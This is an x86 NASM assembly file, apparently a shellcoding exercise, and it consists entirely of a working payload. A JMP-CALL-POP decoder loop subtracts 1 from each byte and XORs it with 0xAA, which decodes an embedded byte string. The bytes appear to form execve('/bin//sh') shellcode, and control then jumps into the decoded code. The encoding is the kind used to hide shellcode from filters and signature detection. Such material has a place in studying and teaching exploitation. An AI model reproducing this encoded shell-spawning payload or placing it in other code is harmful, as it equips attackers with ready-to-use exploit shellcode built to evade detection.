global _start			

section .text
_start:

	jmp short call_decoder	; jump short to call_decoder procedure

decoder: 
	pop esi			; pop memory address pointing at shellcode from the stack

decode:
	sub byte [esi], 0x1	; subtract 1 out of each byte
	xor byte [esi], 0xAA	; xor the subtracted value with the key to retrieve initial value
	jz Shellcode		; jump if 0 (when the shellcode is decrypted)
	inc esi			; increment esi to go to next byte

	jmp short decode	; jump short to decode procedure to continue decrypting

call_decoder:

	call decoder
	Shellcode: db 0x9c,0x6b,0xfb,0xc3,0x86,0x86,0xda,0xc3,0xc3,0x86,0xc9,0xc4,0xc5,0x24,0x4a,0xfb,0x24,0x49,0xfa,0x24,0x4c,0x1b,0xa2,0x68,0x2b,0xab				; encrypted shellcode with 0xab at the end (key + 1)
